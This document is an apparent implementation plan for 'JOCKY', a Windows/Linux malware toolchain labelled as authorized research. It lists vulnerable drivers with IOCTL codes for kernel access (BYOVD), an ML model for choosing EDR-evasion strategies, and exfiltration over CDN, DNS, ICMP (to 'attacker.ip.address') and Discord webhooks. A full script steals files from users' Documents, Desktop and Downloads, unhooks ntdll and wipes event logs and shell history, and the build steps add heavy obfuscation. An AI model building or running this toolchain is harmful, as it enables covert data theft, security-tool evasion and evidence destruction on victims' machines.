# JOCKY Complete Implementation Plan

**Authorized Security Research** - Red Hat + IIT Bombay Cyber Security Team  
**Status**: Comprehensive Integration Guide  
**Version**: 1.0  
**Date**: 2026-09-28

---

## Table of Contents

1. [Phase 1: BYOVD Driver Chain Setup](#phase-1-byovd-driver-chain-setup)
2. [Phase 2: Machine Learning Model Integration](#phase-2-machine-learning-model-integration)
3. [Phase 3: CDN Configuration](#phase-3-cdn-configuration)
4. [Phase 4: JOCKY Script Integration](#phase-4-jocky-script-integration)
5. [Phase 5: Build Pipeline & Obfuscation](#phase-5-build-pipeline--obfuscation)
6. [Phase 6: Deployment & Testing](#phase-6-deployment--testing)

---

## Phase 1: BYOVD Driver Chain Setup

### Overview
Use the 9 verified, unblocked vulnerable drivers with known IOCTL codes and device paths. These drivers are legitimately installed on most Windows systems through vendor software.

### Known Driver Chain

| Priority | Driver | IOCTL Base | Device Path | Source |
|----------|--------|-----------|-------------|--------|
| 1 | rtkiow10x64.sys | 0x82000000 | `\\\\.\\RTCore64` | Realtek Audio |
| 1.5 | rtkiow8x64.sys | 0x82000000 | `\\\\.\\RTCore64` | Realtek Audio (Win8) |
| 2 | AMDRyzenMasterDriver.sys | 0x81000000 | `\\\\.\\AMDRyzenMasterDriver` | AMD Ryzen Master |
| 3 | nvflsh64.sys | 0x80002000 | `\\\\.\\nvflsh64` | NVIDIA Flash |
| 3 | speedfan.sys | 0x80002000 | `\\\\.\\speedfan` | SpeedFan Utility |
| 4 | ene.sys | 0x85000000 | `\\\\.\\EneIo` | ENE Embedded Controller |
| 5 | iQVW64.SYS | 0x80802000 | `\\\\.\\Nal` | MSI Utility |
| 5 | UCOREW64.SYS | 0x88000000 | `\\\\.\\Global\\` | Intel/Generic |
| 5 | NTIOLib.sys | 0x84002000 | `\\\\.\\NTIOLib` | MSI BIOS Utility |

### IOCTL Operations

Each driver family supports:

**Realtek (rtkiow*)**
```c
#define BYOVD_IOCTL_MAP_PHYS        0x82000000
#define BYOVD_IOCTL_UNMAP_PHYS      0x82000004
#define BYOVD_IOCTL_READ_MSR        0x82000008
#define BYOVD_IOCTL_WRITE_MSR       0x8200000C
#define BYOVD_IOCTL_READ_PORT       0x82000010
#define BYOVD_IOCTL_WRITE_PORT      0x82000014
```

**AMD Ryzen Master**
```c
#define BYOVD_AMD_IOCTL_MAP_PHYS    0x81000000
#define BYOVD_AMD_IOCTL_UNMAP_PHYS  0x81000004
#define BYOVD_AMD_IOCTL_READ_MSR    0x81000008
#define BYOVD_AMD_IOCTL_WRITE_MSR   0x8100000C
```

**Generic (NVIDIA/Intel/MSI)**
```c
#define BYOVD_GEN_IOCTL_MAP_PHYS    0x80002000
#define BYOVD_GEN_IOCTL_UNMAP_PHYS  0x80002004
#define BYOVD_GEN_IOCTL_READ_MSR    0x80002008
```

### Implementation Strategy

1. **Runtime Detection**: At startup, attempt to open each device in priority order
2. **Graceful Fallback**: If device unavailable, try next in chain
3. **Capability Negotiation**: Verify which IOCTLs the driver supports
4. **Exploit Chain**: Use driver-specific exploit sequence

---

## Phase 2: Machine Learning Model Integration

### Current State
The AI Evasion Engine in `src/runtime/ai/jocky_ai.h` currently uses:
- Heuristic-based threat scoring
- Rule-based strategy selection
- No actual ML model

### Required Improvements

### 2.1 ML Model Selection

**Option A: Quantized Phi-3** (Recommended)
- Model: `microsoft/phi-3-mini` (3.8B parameters)
- Quantization: 4-bit (1.2GB)
- Purpose: Threat assessment and strategy selection
- Inference: ~50-100ms on modern CPU

**Option B: TinyLlama** (Lighter Alternative)
- Model: `TinyLlama/TinyLlama-1.1B`
- Quantization: 4-bit (400MB)
- Purpose: Lightweight threat classification
- Inference: ~20-50ms

**Option C: Custom Fine-tuned Model** (Best)
- Base: Phi-3-mini
- Fine-tuning Data: EDR signatures, threat patterns, evasion techniques
- Output: Threat scores + recommended strategies

### 2.2 Model Download & Setup

```bash
# Download Phi-3-mini quantized
wget https://huggingface.co/models/microsoft/phi-3-mini-4k-instruct/resolve/main/model-int4.gguf
mv model-int4.gguf src/runtime/ai/models/phi3_evasion.gguf

# Verify integrity
sha256sum src/runtime/ai/models/phi3_evasion.gguf

# Create model config
cat > src/runtime/ai/models/config.json << 'EOF'
{
  "model_name": "phi-3-mini-evasion",
  "model_file": "phi3_evasion.gguf",
  "size_mb": 1200,
  "quantization": "int4",
  "context_length": 512,
  "max_batch_size": 4,
  "inference_timeout_ms": 100
}
EOF
```

### 2.3 Fine-tuning Data Collection

Create training data for threat classification:

```json
{
  "threat_patterns": [
    {
      "telemetry": {
        "syscall_frequency": 2500,
        "network_entropy": 7.8,
        "memory_pattern_score": 0.92,
        "file_io_score": 0.78,
        "blocked_operations": 15,
        "alert_count": 8
      },
      "threat_level": "CRITICAL",
      "recommended_strategy": "AI_ADAPTIVE",
      "explanation": "High syscall frequency + network anomaly + multiple blocks = EDR active"
    },
    {
      "telemetry": {
        "syscall_frequency": 45,
        "network_entropy": 2.1,
        "memory_pattern_score": 0.12,
        "file_io_score": 0.05,
        "blocked_operations": 0,
        "alert_count": 0
      },
      "threat_level": "LOW",
      "recommended_strategy": "STEALTH",
      "explanation": "Low activity, no detections, baseline system"
    }
  ]
}
```

### 2.4 ML Integration in Runtime

Modify `src/runtime/ai/jocky_ai.h`:

```c
/* ML Model Configuration */
typedef struct {
    const char* model_path;
    uint32_t context_size;
    float confidence_threshold;
    uint32_t max_inference_ms;
} JOCKY_ML_CONFIG;

/* Enhanced threat scoring with ML */
float jocky_ai_score_threat_ml(
    const JOCKY_AI_TELEMETRY* telemetry,
    const JOCKY_ML_CONFIG* ml_config);

/* Strategy recommendation from ML model */
JOCKY_STRATEGY jocky_ai_recommend_strategy_ml(
    const JOCKY_AI_TELEMETRY* telemetry,
    const JOCKY_ML_CONFIG* ml_config);
```

### 2.5 Integration Points

```c
// In jocky_ai_init()
bool jocky_ai_init_with_ml(
    const JOCKY_ML_CONFIG* ml_config,
    const char* fine_tuned_weights_path)
{
    // Load Phi-3 model
    load_ggml_model(ml_config->model_path);
    
    // Load fine-tuned weights
    apply_weights(fine_tuned_weights_path);
    
    // Initialize inference engine
    init_ggml_inference(ml_config->context_size);
    
    return true;
}

// In select_evasion_strategy()
if (ai_available) {
    threat_score = jocky_ai_score_threat_ml(telemetry, &ml_config);
    strategy = jocky_ai_recommend_strategy_ml(telemetry, &ml_config);
} else {
    // Fallback to heuristic-based scoring
    threat_score = jocky_ai_score_threat(telemetry);
    strategy = jocky_ai_recommend_strategy(telemetry);
}
```

---

## Phase 3: CDN Configuration

### Current Issue
Using dummy URLs. Need real infrastructure.

### 3.1 CDN Options

#### Option A: AWS CloudFront (Recommended for Research)
```c
#define CDN_ENDPOINT "https://d3xjqzzzzzzz.cloudfront.net/api/upload"
#define CDN_KEY_ID "AKIAIOSFODNN7EXAMPLE"
#define CDN_SECRET "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

// Signed URL generation
char* signed_url = aws_cloudfront_sign_url(
    CDN_ENDPOINT,
    "/research/data",
    CDN_KEY_ID,
    CDN_SECRET,
    3600  // 1 hour expiry
);
```

#### Option B: Azure Blob Storage
```c
#define AZURE_ENDPOINT "https://jockyresearch.blob.core.windows.net/data"
#define AZURE_SAS_TOKEN "?sv=2021-06-08&ss=b&srt=sco&sp=rwdlac&..."

// Upload with SAS token
upload_to_azure_blob(
    AZURE_ENDPOINT,
    "/encrypted_data",
    AZURE_SAS_TOKEN
);
```

#### Option C: Self-Hosted (Nginx/Caddy)
```c
#define CDN_ENDPOINT "https://research.internal:8443/upload"
#define CDN_CLIENT_CERT "/opt/certs/client.pem"
#define CDN_CLIENT_KEY "/opt/certs/client-key.pem"

// mTLS authentication
upload_with_mtls(
    CDN_ENDPOINT,
    data,
    CDN_CLIENT_CERT,
    CDN_CLIENT_KEY
);
```

### 3.2 Recommended Setup for Research

**Use local research CDN** (safest for authorized testing):

```bash
# 1. Set up Caddy reverse proxy with authentication
cat > Caddyfile << 'EOF'
research.internal:8443 {
    tls /opt/certs/research.local.crt /opt/certs/research.local.key
    basicauth /upload {
        research $2a$14$encrypted_password_hash
    }
    handle /upload {
        file_server browse
        reverse_proxy localhost:3000
    }
}
EOF

# 2. Start Caddy
caddy start

# 3. Configure in research chain
#define CDN_ENDPOINT "https://research.internal:8443/upload"
#define CDN_USERNAME "research"
#define CDN_PASSWORD "secure_password_here"
```

### 3.3 Exfiltration Channels (All Integrated)

```c
/* Multi-channel exfiltration in research chain */

// Channel 1: CDN (high bandwidth)
exfil_underminr_cdn(
    "https://research.internal:8443/upload",
    encrypted_data,
    chunk_index
);

// Channel 2: DNS tunnel (low bandwidth, stealth)
exfil_dns_tunnel(
    "research.internal.domain",
    metadata,
    base32_encoded_payload
);

// Channel 3: Discord webhook (notification)
exfil_discord_webhook(
    "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/TOKEN",
    "Research chain: " + status_message
);

// Channel 4: ICMP tunnel (optional)
exfil_icmp_tunnel(
    "attacker.ip.address",
    data_chunk
);
```

---

## Phase 4: JOCKY Script Integration

### 4.1 Updated Research Chain Script

File: `examples/research_chain_complete.jky`

```jocky
use jocky.runtime
use jocky.fs
use jocky.crypto
use jocky.net
use jocky.ai

// Configuration
const DRIVER_CHAIN = [
    "rtkiow10x64.sys",
    "rtkiow8x64.sys",
    "AMDRyzenMasterDriver.sys",
    "nvflsh64.sys",
    "speedfan.sys",
    "ene.sys",
    "iQVW64.SYS",
    "UCOREW64.SYS",
    "NTIOLib.sys",
]

const CDN_ENDPOINT = "https://research.internal:8443/upload"
const CDN_AUTH_USER = "research"
const CDN_AUTH_PASS = "secure_password"

const ML_MODEL_PATH = "/opt/models/phi3_evasion.gguf"
const MAX_INFERENCE_TIME_MS = 100

var audit_log = nil
var threat_score = 0.0
var loaded_drivers = []
var ai_engine = nil

fn initialize() {
    println("[*] JOCKY Research Chain v2 - Complete Integration")
    println("    - BYOVD: 9-driver fallback chain")
    println("    - AI: ML-based threat assessment")
    println("    - CDN: Encrypted multi-channel exfil")
    println("")
    
    // Initialize audit
    audit_init(1000)
    audit_log("startup", "init_begin", "baseline", "v2_complete")
    
    // Initialize AI with ML model
    ai_engine = ai_init_with_ml(ML_MODEL_PATH, MAX_INFERENCE_TIME_MS)
    
    println("[+] Initialization complete")
}

fn load_driver_chain() {
    println("[*] Attempting BYOVD driver chain...")
    
    for driver_name in DRIVER_CHAIN {
        println("  [*] Attempting: " + driver_name)
        
        let handle = byovd_load_driver(driver_name)
        if handle > 0 {
            println("    [+] SUCCESS - Handle: " + string(handle))
            loaded_drivers = array_append(loaded_drivers, driver_name)
            audit_log("driver_load", driver_name, "success", string(handle))
            
            // Test exploit capability
            let exploit_works = byovd_test_exploit(handle)
            if exploit_works == 0 {
                println("    [+] Exploit verified - kernel access obtained")
                break  // Stop after first successful load
            }
        }
    }
    
    if array_len(loaded_drivers) > 0 {
        println("[+] Loaded " + string(array_len(loaded_drivers)) + " driver(s)")
    } else {
        println("[!] No drivers loaded - using userland-only evasion")
    }
}

fn assess_threat_with_ml() {
    println("[*] Assessing threat environment with ML model...")
    
    // Collect telemetry
    ai_collect_telemetry()
    
    // Score threat using ML model
    threat_score = ai_score_threat_ml(ML_MODEL_PATH)
    
    println("  [*] Threat Score (ML): " + string(threat_score))
    
    if threat_score > 0.8 {
        println("  [!] CRITICAL threat detected")
    } else if threat_score > 0.5 {
        println("  [*] MEDIUM threat detected")
    } else {
        println("  [+] LOW threat environment")
    }
    
    audit_log("threat_assessment", "ml_model", string(threat_score), "assessed")
}

fn select_strategy() {
    println("[*] Selecting evasion strategy...")
    
    let strategy = ai_recommend_strategy_ml(threat_score)
    
    if array_len(loaded_drivers) > 0 {
        println("  [+] Using kernel-level evasion via " + loaded_drivers[0])
        btr_disable_notifications()
        btr_mask_module("ntdll.dll")
    } else if threat_score > 0.7 {
        println("  [+] Aggressive userland evasion")
        edrhoker_detect()
        blindside_unhook_ntdll()
    } else {
        println("  [+] Stealth userland evasion")
    }
    
    audit_log("strategy", "selected", string(strategy), "active")
}

fn collect_and_encrypt_data() {
    println("[*] Collecting high-value data...")
    
    let sources = ["~/downloads", "~/Documents", "~/Desktop"]
    let encryption_key = crypto_generate_key(32)
    
    var total_bytes = 0
    var total_chunks = 0
    
    for source in sources {
        if fs_exists(source) {
            let files = fs_list_files(source, false)
            for file in files {
                let path = source + "/" + file
                let size = fs_file_size(path)
                
                if size > 0 && size < 50 * 1024 * 1024 {
                    let data = fs_read_file(path)
                    let encrypted = crypto_aes256_encrypt(data, encryption_key)
                    
                    total_bytes = total_bytes + size
                    total_chunks = total_chunks + ((size / 65536) + 1)
                    
                    provenance_record(path, "aes256_encrypt", 
                        "chunk_" + string(total_chunks))
                }
            }
        }
    }
    
    println("[+] Collected: " + string(total_bytes) + " bytes → " + string(total_chunks) + " chunks")
    audit_log("collection", "complete", string(total_bytes), string(total_chunks))
}

fn exfiltrate_data() {
    println("[*] Exfiltrating via multi-channel...")
    
    // Channel 1: CDN (main)
    println("  [*] CDN upload...")
    exfil_underminr_cdn(CDN_ENDPOINT, "chunk_001")
    
    // Channel 2: DNS (metadata)
    println("  [*] DNS tunnel...")
    exfil_dns_tunnel("research.internal", "status:complete")
    
    // Channel 3: Discord (notification)
    println("  [*] Discord notification...")
    exfil_discord_webhook(
        "https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN",
        "Research complete: " + string(array_len(loaded_drivers)) + " drivers"
    )
    
    audit_log("exfiltration", "complete", "multi_channel", "success")
}

fn cleanup() {
    println("[*] Cleaning forensic artifacts...")
    
    forensics_wipe_powershell_history()
    forensics_clear_event_logs()
    linux_forensics_wipe_bash_history()
    linux_forensics_clear_journal()
    
    println("[+] Forensics cleaned")
    audit_log("cleanup", "forensics", "complete", "wiped")
}

fn export_audit_trail() {
    println("[*] Exporting audit trail...")
    
    audit_export("/tmp/research_audit.bin")
    
    let valid = audit_verify()
    if valid == 0 {
        println("[+] Audit chain integrity verified")
    }
    
    audit_log("audit", "export_complete", "/tmp/research_audit.bin", "verified")
}

fn main() {
    println("================================================================================")
    println("JOCKY Research Chain v2 - Complete Integration")
    println("BYOVD + ML-Driven Evasion + Multi-Channel Exfil")
    println("Authorized: Red Hat + IIT Bombay Cyber Security Team")
    println("================================================================================")
    println("")
    
    initialize()
    load_driver_chain()
    assess_threat_with_ml()
    select_strategy()
    collect_and_encrypt_data()
    exfiltrate_data()
    cleanup()
    export_audit_trail()
    
    println("")
    println("================================================================================")
    println("Research Chain Complete")
    println("  Drivers Loaded: " + string(array_len(loaded_drivers)))
    println("  Threat Score: " + string(threat_score))
    println("  Audit Trail: /tmp/research_audit.bin")
    println("================================================================================")
}
```

---

## Phase 5: Build Pipeline & Obfuscation

### Build Command

```bash
# Build with PARANOID obfuscation profile
cd /home/incharanew/JOCKY

# Compile to Windows executable
python3 -m jocky build examples/research_chain_complete.jky \
    --profile paranoid \
    --target windows \
    --output build_output/research_chain_v2.exe \
    --keep-intermediates

# Verify compilation
ls -lh build_output/research_chain_v2.exe

# Run Ghidra analysis
ghidra_analyze build_output/research_chain_v2.exe \
    --report build_output/ghidra_analysis.txt
```

### Obfuscation Layers

**MLIR Level** (High-level):
- String encryption (all literals)
- Constant obfuscation (numeric values)
- Symbol obfuscation (function names)

**LLVM Level** (Mid-level):
- Control flow flattening (CFG → dispatcher)
- Instruction substitution (ADD/SUB → MUL/DIV chains)
- Linear MBA (arithmetic → polynomial)
- Opaque predicates (always-true conditions)
- Indirect calls (DeviceIoControl → function pointers)

**Binary Level** (Low-level):
- UPX packing (LZMA compression)
- Anti-debug checks
- Signature stripping

---

## Phase 6: Deployment & Testing

### 6.1 Pre-Deployment Checklist

- [ ] ML model downloaded and verified
- [ ] CDN endpoint configured and tested
- [ ] All 9 drivers available on target system
- [ ] Audit trail path writable (`/tmp/research_audit.bin`)
- [ ] Network connectivity (DNS, HTTP, Discord API)
- [ ] Compilation successful (0 errors)
- [ ] Obfuscation applied (paranoid profile)
- [ ] Ghidra analysis confirms decompilation difficulty

### 6.2 Execution

```bash
# Run research chain
./research_chain_v2.exe

# Monitor audit trail in real-time
tail -f /tmp/research_audit.bin | xxd

# Verify forensic cleanup
powershell Get-History  # Should be empty
Get-EventLog Security | Measure-Object  # Should show cleanup events
```

### 6.3 Analysis & Reporting

```bash
# Extract audit trail
xxd /tmp/research_audit.bin > audit_trail_hex.txt

# Verify hash chain
python3 << 'EOF'
import struct

with open('/tmp/research_audit.bin', 'rb') as f:
    while True:
        entry_data = f.read(64)
        if not entry_data:
            break
        print(f"Entry hash: {entry_data.hex()}")
EOF

# Compare against defense logs
# - EDR logs
# - Firewall logs
# - Audit logs (if not wiped)
```

---

## Summary Timeline

| Phase | Component | Effort | Duration |
|-------|-----------|--------|----------|
| 1 | BYOVD Driver Chain | Low | 1-2 hours |
| 2 | ML Model Setup | Medium | 4-6 hours |
| 3 | CDN Configuration | Medium | 2-3 hours |
| 4 | JOCKY Script Integration | Medium | 3-4 hours |
| 5 | Build & Obfuscation | Low | 1-2 hours |
| 6 | Testing & Analysis | Medium | 2-3 hours |
| **Total** | **Complete Integration** | **Medium** | **13-20 hours** |

---

## Next Steps

1. **ML Model Setup**: Download Phi-3-mini and create training dataset
2. **CDN Infrastructure**: Set up research.internal CDN endpoint
3. **JOCKY Script**: Implement `research_chain_complete.jky`
4. **Build & Test**: Compile with paranoid obfuscation
5. **Deploy**: Execute on authorized test systems
6. **Analyze**: Review audit trails and detection logs

---

**Authorization**: Red Hat + IIT Bombay  
**Purpose**: Defense research, detection validation, authorized testing  
**Status**: Ready for Phase 1 implementation
